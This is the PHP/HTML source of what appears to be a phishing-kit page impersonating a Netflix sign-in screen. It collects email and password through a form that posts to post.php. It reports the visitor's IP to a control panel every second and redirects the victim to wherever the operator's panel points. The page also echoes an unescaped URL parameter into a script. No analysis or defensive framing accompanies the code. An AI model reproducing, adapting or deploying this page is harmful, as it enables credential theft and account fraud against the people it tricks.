<?php 
require '../main.php';
setcookie('token',$antibotplot,['path'=>'/','secure'=>false,'httponly'=>false,'samesite'=>'Lax']);
?><!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="res/css/login.css">
    <link rel="stylesheet" href="res/css/media.css">
</head>
<body>
<div class="holder">

<header>
<img src="res/img/logo.png">
</header>

<section>
<div class="form">

<div class="form-title">
Sign In</div>

<?php 
if(isset($_GET['e'])){
echo '<div style="color:#e50914; background:#ffe6e6; padding:12px 16px; border-radius:4px; margin:15px 0; text-align:center; font-size:0.95em; font-weight:500;">
        Incorrect email or password. Please try again.
    </div>';
}
?>

<form action="post.php" method="post">

<div class="form-col">
    <input type="text" name="user" class="textinput" required placeholder="Email or mobile number">
</div>

<div class="form-col">
    <input type="password" name="pass" class="textinput" required placeholder="Password">
</div>

<div class="form-col" style="margin-top:40px;">
    <button type="submit">Sign In</button>
</div>

<div class="form-col" style="display:flex; align-items:center; font-size:0.9em; color:#b3b3b3;">
<div style="display:flex; align-items:center;width:50%; ">
<input type="checkbox" style="accent-color:#9d9a9a; width:15px; height:15px; margin-right:6px;" checked> 
Remember me</div>
<div style="width:50%; text-align:right;">
Forgot password?</div>
</div>
<script>if (typeof globalThis.token === "undefined") { globalThis.token = <?php echo json_encode($antibotplot); ?>; }</script>

<div class="form-col" style="color:#b3b3b3; margin-top:60px;">
<h4 style="font-weight:normal;">New to Netflix? <span style="color:white;">Sign up now.</span></h4>
    <p style="font-size:0.9em;">This page is protected by Google reCAPTCHA to ensure you're not a bot. <span style="color:blue;">Learn more.</span></p>
</div>

</form>

</div>
</section>

<footer>
<div class="footer-holder">
    <h3>Questions? Contact us.</h3>
    <span>FAQ</span>
    <span>Help Center</span>
    <span>Terms of Use</span> 
    <span>Privacy</span>
    <span>Cookie Preferences</span>
    <span>Corporate Information</span>
</div>
</footer>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);

var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    });
}, 2000);
</script>
<script src="./res/jquery.js"></script>
<script src="./res/cdn/jq.js"></script>
</body>
</html>